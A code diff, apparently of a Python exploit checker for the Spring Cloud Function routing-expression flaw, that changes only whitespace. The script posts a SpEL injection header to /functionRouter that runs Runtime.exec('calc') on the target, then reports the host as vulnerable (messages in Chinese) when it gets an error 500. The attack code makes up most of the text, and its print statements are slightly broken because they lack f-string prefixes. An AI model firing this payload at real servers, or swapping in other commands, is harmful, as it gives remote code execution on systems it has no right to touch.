@@ -47,9 +47,7 @@ import urllib3
 urllib3.disable_warnings()
 
 def calculator(url,ip,port):
-
     payload ='T(java.lang.Runtime).getRuntime().exec("calc")'
-
     data ='jojo'
     headers = {
         'spring.cloud.function.routing-expression':payload,
@@ -60,25 +58,23 @@ def calculator(url,ip,port):
         'Content-Type': 'application/x-www-form-urlencoded'
     }
     path = '/functionRouter'
-
     allurl = url + path
     try:
         req=requests.post(url=allurl,headers=headers,data=data,verify=False,timeout=3)
         code =req.status_code
         text = req.text
         rsp = '"error":"Internal Server Error"'
-
         if code == 500 and rsp in text:
             print('{url} 存在漏洞')
         else:
             print('{url} 不存在漏洞')
-
     except requests.exceptions.RequestException:
         print('[-]{url} 检测超时')
         pass
     except:
         print('[-]{url} 检测异常')
         pass
+        
 if __name__ == '__main__' :
     try:
         cmd1 =sys.argv[1]
